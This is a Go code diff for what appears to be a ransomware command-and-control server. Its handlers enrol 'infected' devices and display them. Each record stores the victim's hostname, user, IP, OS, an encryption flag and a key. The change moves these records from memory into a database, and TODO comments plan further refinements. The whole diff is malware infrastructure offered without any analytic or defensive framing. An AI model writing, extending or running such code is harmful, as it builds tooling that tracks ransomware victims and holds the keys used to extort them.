@@ -9,21 +9,21 @@ import (
 	"net/http"
 )
 
+type Enumeration struct {
+	ID        string `json:"ID"`
+	Hostname  string `json:"Hostname"`
+	User      string `json:"User"`
+	IP        string `json:"IP"`
+	Pwd       string `json:"Pwd"`
+	OS        string `json:"OS"`
+	Encrypted bool
+	Key       string
+}
+
 var (
 	device  Enumeration
 	devices []Enumeration
 )
-
-type Enumeration struct {
-	ID        string   `json:"ID"`
-	Hostname  string   `json:"Hostname"`
-	User      string   `json:"User"`
-	IP        []string `json:"IP"`
-	Pwd       string   `json:"Pwd"`
-	OS        string   `json:"OS"`
-	Encrypted bool
-	Key       string
-}
 
 //used for querying that webserver is running
 func HomeHandler(w http.ResponseWriter, r *http.Request) {
@@ -44,7 +44,18 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 	json.Unmarshal([]byte(req), &device)
 	log.Printf("Enrolled a new device: %s", device.ID)
 	device.Encrypted = false
-	devices = append(devices, device)
+
+	dbConnection, err := Connect() //connect to the database
+	if err != nil {
+		log.Println("Cannot connect to db ", err)
+	}
+	err = Insert(dbConnection, device)
+	if err != nil {
+		log.Printf("Issue inserting data into the database for device: %s \nwith error: %s", device.ID, err.Error())
+	}
+
+	//TODO: Change the insert function in DBconnect to check if ID has already been registered or not.
+	//TODO: Tidy up the error messages.
 
 }
 
@@ -53,6 +64,14 @@ func ViewInfected(w http.ResponseWriter, r *http.Request) {
 	t, err := template.ParseFiles("./pages/infected.gohtml")
 	if err != nil {
 		log.Fatalf("Issue with 'infected' html template: %s", err.Error())
+	}
+	dbConnection, err := Connect() //connect to the database
+	if err != nil {
+		log.Println("Cannot connect to db ", err)
+	}
+	devices, err := Query(dbConnection)
+	if err != nil {
+		log.Println("Cannot connect to db ", err)
 	}
 	t.Execute(w, devices)
 }
